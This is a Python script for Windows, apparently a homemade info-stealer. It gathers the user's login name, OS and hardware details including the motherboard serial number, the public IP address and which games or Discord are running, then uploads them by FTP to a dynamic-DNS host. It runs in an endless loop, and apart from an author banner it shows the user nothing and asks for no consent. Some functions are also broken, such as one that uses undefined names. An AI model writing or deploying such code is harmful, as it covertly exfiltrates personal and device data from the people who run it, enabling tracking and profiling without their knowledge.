from ftplib import FTP
import os
import time
import psutil
import wmi
import platform
from hurry.filesize import size
import win32com.client
import subprocess

def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

def get_motherboard_details():
	motherboard_details = []
	strComputer = "."
	objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
	objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
	colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_BaseBoard")
	for objItem in colItems:
		main_board = {
			'name': objItem.Name,
			'description': objItem.Description,
			'manufacturer': objItem.Manufacturer,
			'model': objItem.Model,
			'product': objItem.Product,
			'serialNumber': objItem.SerialNumber,
			'version': objItem.Version
		}
		motherboard_details.append(main_board)
	return motherboard_details

ver = "v1.4"
author = "ReyMadness"

def directory_exists(name):
    filelist = []
    ftp.retrlines('LIST',filelist.append)
    for f in filelist:
        if f.split()[-1] == dir and f.upper().startswith('D'):
            return True
    return False

print("Created by", author, ver, "\n")

def main():
    #FTP-check
    ip = "reymadness.ddns.net"
    port = 63957
    ftp = FTP()
    try:
        ftp.connect(ip, port)
        connecton = 1
    except:
        connecton = 0
        print('No connection to FTP-server')
        time.sleep(3)
        main()
        
    #Getting data from computer
    #Time
    name = os.getlogin()
    year = str(time.localtime()[0])
    month = str(time.localtime()[1])
    day = str(time.localtime()[2])
    hour = str(time.localtime()[3])
    minute = str(time.localtime()[4])
    second = str(time.localtime()[5])
    now = "Date: " + year + "-" + month + "-" + day + "\n" + "Time: " + hour + ":" + minute + ":" + second + "\n"
    #Hardware
    computer = wmi.WMI()
    os_info = computer.Win32_OperatingSystem()[0]
    proc_info = computer.Win32_Processor()[0]
    gpu_info = computer.Win32_VideoController()[0]
    ram_info = float(os_info.TotalVisibleMemorySize) / 1048576
    ram = str(round(float('{0}'.format(ram_info)))) + " GB"
    op_system = platform.system()
    op_release = platform.release()
    op_x = platform.machine()
    op_ver = platform.version()
    op = "OP. System: " + op_system + " " + op_release + " " + op_ver + " " + op_x + "\n"
    i = 0
    mass = str(get_motherboard_details()[0]).split()
    a = len(mass)
    while(i<a):
        if(mass[i] == "'manufacturer':"):
            b = mass[i+1][1:][:-2]
        if(mass[i] == "'product':"):
            c = ""
            while(mass[i+1] != "'serialNumber':"):
                c = c + mass[i+1] + " "
                i += 1
        if(mass[i] == "'serialNumber':"):
            d = mass[i+1][1:][:-2]
        i += 1
    motherboard = b + " " + c[1:][:-3] + " " + d
    info = "Processor: {0}".format(proc_info.Name) + "\nVideo Card: {0}".format(gpu_info.Name) + "\nRAM: " + ram + "\n" + "Motherboard: " + motherboard + "\n\n"
    #Games and programs check
    if checkIfProcessRunning('discord'):
        discord = "Discord is ON\n"
    else:
        discord = ""
        
    if checkIfProcessRunning('csgo'):
        csgo = "CS:GO is ON\n"
    else:
        csgo = ""
        
    if checkIfProcessRunning('FortniteClient-Win64-Shipping.exe'):
        fortnite = "Fortnite is ON\n"
    else:
        fortnite = ""

    if checkIfProcessRunning('dota2'):
        dota2 = "Dota 2 is ON\n"
    else:
        dota2 = ""

    if checkIfProcessRunning('osu!'):
        osu = "Osu! is ON\n"
    else:
        osu = ""
    #IP
    ip_check = subprocess.check_output('nslookup myip.opendns.com resolver1.opendns.com', shell=True)
    IP = str(ip_check.split()[len(ip_check.split())-1])[2:][:-1]
    ip = "IP: " + IP + "\n"

    #Sending data to server
    if(connecton == 0):
        pass
    else:
        ftp.login("data")
        try:
            ftp.mkd(name)
        except:
            pass
        ftp.cwd(name)
        f = open("data.txt", "w")
        text = "Version: " + ver + "\n" +  name + "\n" + now + op + ip + info + discord + csgo + fortnite + dota2 + osu
        f.write(text)
        f.close()
        with open("data.txt") as fobj:
            ftp.storlines("STOR data.txt", open("data.txt", 'rb'))
            ftp.close()
        os.remove('data.txt')
    time.sleep(1)
    main()
main()
